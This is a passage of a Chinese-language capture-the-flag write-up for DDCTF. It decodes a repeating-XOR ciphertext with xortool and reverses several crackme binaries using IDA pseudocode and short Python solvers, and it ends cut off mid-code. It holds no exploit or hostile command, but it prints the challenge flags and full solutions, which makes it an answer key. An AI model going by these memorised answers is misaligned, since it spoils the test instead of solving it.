1f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07</span><br></pre></td></tr></table></figure><p>提示原文是英文，最初的想法是通过词频来还原，写了段代码，简单统计了一下数据出现的次数，发现有159种二进制，应该不是简单的替换，猜测可能经过异或处理。此处祭出神器xortool，英文最多的必须是空格，那么以空格为参考进行爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">F:\hack\tools\crypto\xortool-master\xortool</span><br><span class="line">λ py -2 xortool -c &quot; &quot; X:\tmp\MulTzor</span><br><span class="line">The most probable key lengths:</span><br><span class="line">   3:   11.9%</span><br><span class="line">   6:   19.7%</span><br><span class="line">   9:   9.3%</span><br><span class="line">  12:   14.5%</span><br><span class="line">  15:   7.1%</span><br><span class="line">  18:   11.2%</span><br><span class="line">  21:   5.4%</span><br><span class="line">  24:   8.4%</span><br><span class="line">  30:   6.8%</span><br><span class="line">  36:   5.7%</span><br><span class="line">Key-length can be 3*n</span><br><span class="line">2 possible key(s) of length 6:</span><br><span class="line">\x0b\rz4\xaa\x12</span><br><span class="line">N\rz4\xaa\x12</span><br><span class="line">Found 2 plaintexts with 95.0%+ printable characters</span><br><span class="line">See files filename-key.csv, filename-char_used-perc_printable.csv</span><br></pre></td></tr></table></figure><p>直接爆出了key，进行xor即可还原明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been &quot;decisive&quot; to the Allied victory.</span><br><span class="line"></span><br><span class="line">The Enigma machines were a family of portable cipher machines with rotor scramblers. Good operating procedures, properly enforced, would have made the plugboard Enigma machine unbreakable. However, most of the German military forces, secret services and civilian agencies that used Enigma employed poor operating procedures, and it was these poor procedures that allowed the Enigma machines to be reverse-engineered and the ciphers to be read.</span><br><span class="line"></span><br><span class="line">The German plugboard-equipped Enigma became Nazi Germany&apos;s principal crypto-system. It was broken by the Polish General Staff&apos;s Cipher Bureau in December 1932, with the aid of French-supplied intelligence material obtained from a German spy. A month before the outbreak of World War II, at a conference held near Warsaw, the Polish Cipher Bureau shared its Enigma-breaking techniques and technology with the French and British. During the German invasion of Poland, core Polish Cipher Bureau personnel were evacuated, via Romania, to France where they established the PC Bruno signals intelligence station with French facilities support. Successful cooperation among the Poles, the French, and the British at Bletchley Park continued until June 1940, when France surrendered to the Germans.</span><br><span class="line"></span><br><span class="line">From this beginning, the British Government Code and Cypher School (GC&amp;CS) at Bletchley Park built up an extensive cryptanalytic capability. Initially, the decryption was mainly of Luftwaffe (German air force) and a few Heer (German army) messages, as the Kriegsmarine (German navy) employed much more secure procedures for using Enigma. Alan Turing, a Cambridge University mathematician and logician, provided much of the original thinking that led to the design of the cryptanalytical bombe machines that were instrumental in eventually breaking the naval Enigma. However, the Kriegsmarine introduced an Enigma version with a fourth rotor for its U-boats, resulting in a prolonged period when these messages could not be decrypted. With the capture of relevant cipher keys and the use of much faster US Navy bombes, regular, rapid reading of U-boat messages resumed.</span><br><span class="line"></span><br><span class="line">The flag is: DDCTF&#123;07b1b46d1db28843d1fd76889fea9b36&#125;</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h3><p><strong>静态分析法</strong></p><p>使用peid进行检查，发现upx壳，<code>upx -d reverse1_final.exe</code>进行脱壳（脱壳后的exe在win10下不能运行，XP下可以运行），直接拖入IDA进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input code:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v6);</span><br><span class="line">  sub_401000(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">"DDCTF&#123;reverseME&#125;"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You've got it!!%s\n"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try again later.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数逻辑比较简单 ，把输入的字符串调用<code>sub_401000</code>函数进行处理，然后和 <code>DDCTF{reverseME}</code> 进行比较。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[(<span class="keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双击跟进<code>byte_402FF8</code>发现并不存在，LXY大神的分析如下：</p><blockquote><p>翻看了下PE头中.rdata和.data的定义，发现.rdata的RVA是0x2000，内存大小为0x622，.data的RVA是0x3000。也就是说虚拟地址0x402000-0x402621是.rdata段。0x402622至0x402fff为未定义的内存空间（实际上内存页大小是0x1000，所以该端内存的会被默认填充为0）。但这不妨碍我们通过0x402ff8作为基址进行内存定位。翻了下.data段立马发现从0x403018开始为一个疑似转换表。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#\"!"</span></span><br><span class="line">base=<span class="number">0x402ff8</span></span><br><span class="line">table=<span class="number">0x403018</span></span><br><span class="line">b=<span class="string">"DDCTF&#123;reverseME&#125;"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(a.index(b[i])+table-base) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b))])  <span class="comment"># ZZ[JX#,9(9,+9QY!</span></span><br></pre></td></tr></table></figure><p><strong>动态调试法</strong></p><p>根据ida反汇编的伪代码，在<code>strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;)</code>下断点</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134236-c53fe5c2-619c-1.png" alt=""></p><p>可以根据输入和处理结果的映射关系，逆向还原flag</p><h3 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows Reverse2"></a>Windows Reverse2</h3><p>使用peid进行检查，发现aspack壳，用<code>Aspack stripper</code>脱壳后拖入IDA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Dest; <span class="comment">// [esp+8h] [ebp-C04h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+9h] [ebp-C03h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+408h] [ebp-804h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+409h] [ebp-803h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+808h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+809h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(Format);</span><br><span class="line">  <span class="built_in">scanf</span>(aS, &amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !check_hex(&amp;v6) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(aInvalidInput);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401240(&amp;v6, (<span class="keyword">int</span>)&amp;v8);                    <span class="comment">// decode('hex').encode('base64')</span></span><br><span class="line">  Dest = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;Dest, aDdctfS, &amp;v8);                 <span class="comment">// DDCTF&#123;%s&#125;</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;Dest, aDdctfReverse) )          <span class="comment">// DDCTF&#123;reverse+&#125;</span></span><br><span class="line">    <span class="built_in">printf</span>(aYouVeGotItS, &amp;Dest);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(aSomethingWrong);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序要求输入16进制，然后经过<code>sub_401240</code>处理后与<code>reverse+</code>比较，伪代码比较难看，还是直接用动态调试吧，继续在字符串比较处下一个断点。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134141-a4572636-619c-1.png" alt=""></p><p>不难发现<code>sub_401240</code>函数将输入进行了hex解码和base64编码，直接逆向运算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">'EjRWeJA='</span>.decode(<span class="string">'base64'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="number">1234567890</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"reverse+"</span>.decode(<span class="string">"base64"</span>).encode(<span class="string">"hex"</span>).upper())</span><br><span class="line">ADEBDEAEC7BE</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; X:\tmp\reverse2_final.exe</span><br><span class="line">input code:ADEBDEAEC7BE</span><br><span class="line">You<span class="string">'ve got it !!! DDCTF&#123;reverse+&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Confused"><a href="#Confused" class="headerlink" title="Confused"></a>Confused</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl -[ViewController checkCode:](ViewController *self, SEL a2, id a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// [rsp+38h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">void</span> *v13; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  __int128 v14; <span class="comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  SEL v16; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *v21; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = self;</span><br><span class="line">  v16 = a2;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  objc_storeStrong(&amp;v15, a3);</span><br><span class="line">  v3 = objc_msgSend(v17, <span class="string">"pwd"</span>);</span><br><span class="line">  v4 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v3);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = objc_msgSend(v4, <span class="string">"stringValue"</span>);</span><br><span class="line">  v14 = (<span class="keyword">unsigned</span> __int64)objc_retainAutoreleasedReturnValue(v6);</span><br><span class="line">  objc_release(v5);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)objc_msgSend((<span class="keyword">void</span> *)v14, <span class="string">"hasPrefix:"</span>, CFSTR(<span class="string">"DDCTF&#123;"</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)objc_msgSend((<span class="keyword">void</span> *)v14, <span class="string">"length"</span>);</span><br><span class="line">    v8 = objc_msgSend((<span class="keyword">void</span> *)v14, <span class="string">"substringFromIndex:"</span>, v7 - <span class="number">1</span>);</span><br><span class="line">    v13 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v8);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)objc_msgSend(v13, <span class="string">"isEqualToString:"</span>, CFSTR(<span class="string">"&#125;"</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (<span class="keyword">char</span> *)objc_msgSend((<span class="keyword">void</span> *)v14, <span class="string">"length"</span>);</span><br><span class="line">      v19 = <span class="number">6L</span>L;</span><br><span class="line">      v18 = v9 - <span class="number">7</span>;</span><br><span class="line">      v20 = <span class="number">6L</span>L;</span><br><span class="line">      v21 = v9 - <span class="number">7</span>;</span><br><span class="line">      v10 = objc_msgSend((<span class="keyword">void</span> *)v14, <span class="string">"substringWithRange:"</span>, <span class="number">6L</span>L, v9 - <span class="number">7</span>);</span><br><span class="line">      v12 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v10);</span><br><span class="line">      <span class="keyword">if</span> ( objc_msgSend(v12, <span class="string">"length"</span>) == (<span class="keyword">void</span> *)<span class="number">18</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = (<span class="keyword">void</span> *)objc_retainAutorelease(v12);</span><br><span class="line">        *((_QWORD *)&amp;v14 + <span class="number">1</span>) = objc_msgSend(v11, <span class="string">"UTF8String"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      objc_storeStrong(&amp;v12, <span class="number">0L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    objc_storeStrong(&amp;v13, <span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;v14 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1000011D0(*((__int64 *)&amp;v14 + <span class="number">1</span>)) == <span class="number">1</span> )</span><br><span class="line">      objc_msgSend(v17, <span class="string">"onSuccess"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      objc_msgSend(v17, <span class="string">"onFailed"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    objc_msgSend(v17, <span class="string">"onFailed"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  objc_storeStrong(&amp;v14, <span class="number">0L</span>L);</span><br><span class="line">  objc_storeStrong(&amp;v15, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到成功的提示，往前一个函数为判断函数。函数内首先分配内存，初始化虚拟机，最后将输入去头尾后代入虚拟机，虚拟机将读入指令中存储的数据，加二，与输入比较，如失败，跳到最后，成功则执行下条指令，逻辑同上。故将指令中字符提取如下：fcjjmWmsEmrRfcDjye。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_100001C60</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = rot2(*(_DWORD *)a1, <span class="number">2</span>);</span><br><span class="line">  *(_DWORD *)a1 = (<span class="keyword">char</span>)result;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据伪代码重写一个<code>rot2</code>函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">a = <span class="string">'fcjjmWmsEmrRfcDjye'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot2</span><span class="params">(s)</span>:</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> string.lowercase:</span><br><span class="line">res += chr((ord(i)+<span class="number">2</span><span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += chr((ord(i)+<span class="number">2</span><span class="number">-65</span>)%<span class="number">26</span>+<span class="number">65</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">print</span> rot2(a)</span><br></pre></td></tr></table></figure><p>加入DDCTF{}后得到FLAG:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;helloYouGotTheFlag&#125;</span><br></pre></td></tr></table></figure><h3 id="obfuscating-macros"><a href="#obfuscating-macros" class="headerlink" title="obfuscating macros"></a>obfuscating macros</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// al</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span 